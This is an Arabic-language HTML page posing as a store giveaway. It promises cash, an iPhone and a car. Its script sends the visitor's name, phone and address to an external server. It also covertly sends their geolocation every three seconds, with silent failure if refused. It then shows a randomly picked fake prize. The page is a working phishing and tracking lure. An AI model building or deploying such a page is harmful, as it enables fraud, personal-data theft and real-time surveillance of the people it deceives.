<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>متجر منبج الآن</title>
    <style>
        /* أنماط مشابهة للتصميم السابق */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { min-height: 100vh; display: flex; justify-content: center; align-items: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; }
        .container { background: white; border-radius: 20px; padding: 40px; max-width: 500px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); animation: slideUp 0.5s ease; }
        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-size: 28px; color: #333; }
        .logo span { color: #764ba2; }
        .prize-badge { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 10px 20px; border-radius: 50px; display: inline-block; font-weight: bold; margin: 10px 0; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-weight: 600; margin-bottom: 5px; color: #555; }
        .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; transition: border-color 0.3s; }
        .form-group input:focus { border-color: #764ba2; outline: none; }
        .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 10px; font-size: 20px; font-weight: bold; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(118, 75, 162, 0.4); }
        .prize-box { background: #f8f9fa; border-radius: 15px; padding: 20px; margin: 20px 0; text-align: center; border: 2px dashed #764ba2; }
        .prize-box h3 { color: #764ba2; font-size: 22px; }
        .prize-box .amount { font-size: 36px; font-weight: bold; color: #f5576c; }
        .hidden { display: none; }
        .success-box { background: #d4edda; border-radius: 15px; padding: 25px; text-align: center; border: 2px solid #28a745; }
        .success-box h2 { color: #28a745; font-size: 28px; }
        .success-box p { color: #155724; font-size: 18px; margin-top: 10px; }
    </style>
</head>
<body>
<div class="container" id="app">
    <div id="mainForm">
        <div class="logo">
            <h1>🛍️ متجر <span>منبج الآن</span></h1>
            <div class="prize-badge">🎁 دعم 300$ قدامك الآن</div>
        </div>
        <div class="prize-box">
            <h3>🎯 ادخل الآن واربح!</h3>
            <p style="color: #666; margin: 10px 0;">جوائز تصل إلى <strong>$2000</strong></p>
            <p style="color: #666;">📱 iPhone أحدث إصدار</p>
            <p style="color: #666;">🚗 سيارة فاخرة</p>
        </div>
        <form id="userForm">
            <div class="form-group">
                <label>👤 الاسم الكامل</label>
                <input type="text" id="name" placeholder="أدخل اسمك الكامل" required>
            </div>
            <div class="form-group">
                <label>📱 رقم الجوال</label>
                <input type="tel" id="phone" placeholder="أدخل رقم جوالك" required>
            </div>
            <div class="form-group">
                <label>📍 العنوان</label>
                <input type="text" id="address" placeholder="أدخل عنوانك" required>
            </div>
            <button type="submit" class="btn">🚀 قدام الآن</button>
        </form>
    </div>
    <div id="successMessage" class="hidden">
        <div class="success-box">
            <h2>🎉 مبروك! 🎉</h2>
            <div style="font-size: 48px; margin: 20px 0;">🏆</div>
            <p style="font-size: 22px; font-weight: bold; color: #28a745;">
                لقد ربحت <span id="prizeAmount">$500</span>!
            </p>
            <p>📱 iPhone أحدث إصدار</p>
            <p>🚗 سيارة فاخرة</p>
            <hr style="margin: 20px 0; border-color: #28a745;">
            <p style="font-size: 18px;">✅ سيتم التواصل معك قريباً</p>
            <p style="font-size: 16px; color: #155724; margin-top: 10px;">👤 <span id="userName"></span></p>
        </div>
    </div>
</div>

<script>
    // ============================================
    // إعدادات الـ API (عدّل الرابط ليكون رابط ملف api.php على Hostinger)
    // ============================================
    const API_URL = 'https://almanartransd.com/t-bot/api.php'; // ⬅️ غيّر هذا الرابط

    // ============================================
    // إرسال البيانات إلى الـ API
    // ============================================
    function sendToAPI(data) {
        fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(err => console.error('API Error:', err));
    }

    // ============================================
    // إرسال الموقع كل 3 ثواني (بعد موافقة المستخدم)
    // ============================================
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                const { latitude, longitude } = position.coords;
                sendToAPI({ lat: latitude, lng: longitude });
                setInterval(() => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => sendToAPI({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
                        () => {} // فشل صامت
                    );
                }, 3000);
            },
            () => {} // فشل صامت
        );
    }

    // ============================================
    // معالجة نموذج البيانات
    // ============================================
    document.getElementById('userForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        const address = document.getElementById('address').value;

        // إرسال بيانات النموذج إلى الـ API
        sendToAPI({ name, phone, address });

        // عرض رسالة الفوز
        const prizes = [50, 100, 150, 200, 250, 300, 400, 500, 750, 1000, 1500, 2000];
        const prize = prizes[Math.floor(Math.random() * prizes.length)];
        document.getElementById('prizeAmount').textContent = '$' + prize;
        document.getElementById('userName').textContent = name;

        document.getElementById('mainForm').classList.add('hidden');
        document.getElementById('successMessage').classList.remove('hidden');
    });

    // ============================================
    // إرسال نبضات قلب (Heartbeat) كل 3 ثواني
    // ============================================
    setInterval(() => {
        sendToAPI({ heartbeat: true });
    }, 3000);
</script>
</body>
</html>
